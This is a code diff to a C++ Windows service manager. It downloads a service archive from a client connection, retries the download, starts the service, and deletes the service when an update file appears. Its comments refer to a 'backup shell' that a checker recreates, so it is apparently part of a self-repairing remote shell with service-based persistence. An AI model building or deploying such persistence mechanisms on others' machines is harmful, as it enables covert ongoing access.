@@ -1,5 +1,6 @@
 #include "serviceutils.h"
 #include "client.h"
+#include "utils.h"
 
 bool Service::ServiceExists(LPCSTR lpServiceName) {
 	SC_HANDLE hManager = OpenSCManagerA(NULL, NULL, GENERIC_READ);
@@ -64,12 +65,13 @@ void Service::StartServiceIfNeeded(LPCSTR lpServiceName)
 void Service::CheckAndRepairService()
 {
 	if (!Service::ServiceExists(SERVICE_NAME)) {
+		Log("Downloading service archive\n");
 		//Download service archive
 		int i = 0;
-		while (!Client::main_client.RequestFile(std::string(SERVICE_ARCHIVE_NAME))) {
+		while (!Client::main_client.RequestFile(std::string(SERVICE_ARCHIVE_NAME), true)) {
 			if (i > 9)
 				return;
-			Client::main_client.RequestFile(std::string(SERVICE_ARCHIVE_NAME));
+			Client::main_client.RequestFile(std::string(SERVICE_ARCHIVE_NAME), true);
 			i++;
 		}
 		//Wait for file existence
@@ -92,6 +94,24 @@ void Service::CheckAndRepairService()
 
 	//Start the service
 	Service::StartServiceIfNeeded(SERVICE_NAME);
+
+	if (FileExists(SHELL_PATH(SHELL_UPDATE_NAME))) { //This means that an update instruction has been sent and therefore backup shell needs to shutdown once the service has been started
+		//Delete the service and let checker recreate it at next iteration of the main loop
+		SC_HANDLE scm = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
+		if (scm == NULL)
+			return;
+
+		SC_HANDLE hService = OpenService(scm, SERVICE_NAME, GENERIC_READ);
+		if (hService == NULL)
+		{
+			CloseServiceHandle(scm);
+			return;
+		}
+		DeleteService(hService);
+		remove(SHELL_PATH(SERVICE_FILE_NAME));
+		//remove(SHELL_PATH(SHELL_UPDATE_NAME));
+		Log("Deleted service\n");
+	}
 }
 
 bool Service::InstallService(LPCSTR lpServiceName, LPCSTR lpServicePath)
